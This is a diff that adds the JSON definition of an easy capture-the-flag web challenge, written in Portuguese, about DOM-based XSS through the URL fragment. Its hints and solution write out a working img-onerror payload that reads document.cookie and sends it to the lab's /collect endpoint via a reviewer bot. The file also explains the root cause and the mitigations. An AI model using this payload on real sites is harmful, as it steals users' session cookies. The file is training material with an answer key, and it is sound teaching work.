@@ -1,0 +1,80 @@
+{
+  "slug": "xss-dom-hash",
+  "title": "Fragmento de execução",
+  "codename": "MIRROR DOCS",
+  "summary": "O Mirror Docs renderiza o fragmento da URL com innerHTML. O servidor nunca vê o payload, então filtros server-side não importam. Faça o bot revisor abrir um fragmento malicioso.",
+  "category": "xss",
+  "difficulty": "easy",
+  "kind": "challenge",
+  "lab_dir": "xss-dom-hash",
+  "estimated_minutes": 20,
+  "xp": 125,
+  "tech": [
+    "JavaScript",
+    "DOM",
+    "Selenium bot"
+  ],
+  "tags": [
+    "xss",
+    "dom-based",
+    "url-fragment"
+  ],
+  "story": "O Mirror Docs é um preview estático de navegador. O cliente decodifica `location.hash` e o atribui a `innerHTML`. O servidor não tem ideia do que o fragmento contém. O bot revisor tem um cookie de sessão legível.",
+  "objective": "Encontre o DOM XSS no renderizador de fragmentos, entregue um payload ao bot revisor e envie o cookie capturado por `/collect`.",
+  "rules": "O bot abre apenas paths loopback neste alvo. Não o envie para hosts externos.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Cookie do bot revisor",
+      "flag_type": "user",
+      "points": 125,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "O servidor não vê nada",
+      "body": "Veja o código-fonte: `location.hash` é decodificado e atribuído a `preview.innerHTML`. Fragmentos não são enviados ao servidor, então inspecione o código do cliente com o DevTools.",
+      "cost": 10
+    },
+    {
+      "level": 2,
+      "title": "Use um event handler",
+      "body": "`<img src=x onerror=\"fetch('/collect?c='+encodeURIComponent(document.cookie))\">` executa quando a imagem quebrada carrega.",
+      "cost": 20
+    },
+    {
+      "level": 3,
+      "title": "Codifique o fragmento para URL",
+      "body": "Envie `/#<img src=x onerror=\"fetch('/collect?c='+encodeURIComponent(document.cookie))\">` para `/report`. Depois abra `/captured` e envie o valor de `review_session`.",
+      "cost": 25
+    }
+  ],
+  "solution": {
+    "walkthrough": "1. Abra `/` e inspecione o script inline. Ele faz `preview.innerHTML = decodeURIComponent(location.hash.slice(1))`.\n2. Crie um fragmento:\n```text\n#<img src=x onerror=\"fetch('/collect?c='+encodeURIComponent(document.cookie))\">\n```\n3. Envie esse path/fragmento em `/report` para que o bot o carregue.\n4. Leia `/captured`; envie o valor do cookie. O callback do objetivo é disparado pelo collector de exfiltração.",
+    "root_cause": "DOM-based XSS. Dados de fragmento não sanitizados são escritos em um sink HTML (`innerHTML`) inteiramente no navegador. Filtros server-side de request e validação de path de URL não conseguem inspecionar um fragmento.",
+    "mitigation": "Renderize fragmentos não confiáveis com `textContent` ou templating seguro. Se HTML for necessário, sanitize com uma allow-list validada e aplique Trusted Types/CSP. Mantenha cookies sensíveis como HttpOnly; perfis de revisor isolados são defesa em profundidade."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — DOM-based XSS",
+      "url": "https://portswigger.net/web-security/cross-site-scripting/dom-based",
+      "source_type": "official",
+      "description": "Sources, sinks e DOM XSS baseado em fragmento."
+    },
+    {
+      "title": "OWASP — DOM-based XSS Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "DOM sinks seguros e tratamento de saída."
+    },
+    {
+      "title": "MDN — Element.innerHTML",
+      "url": "https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML",
+      "source_type": "standard",
+      "description": "Por que innerHTML é um sink HTML inseguro."
+    }
+  ]
+}
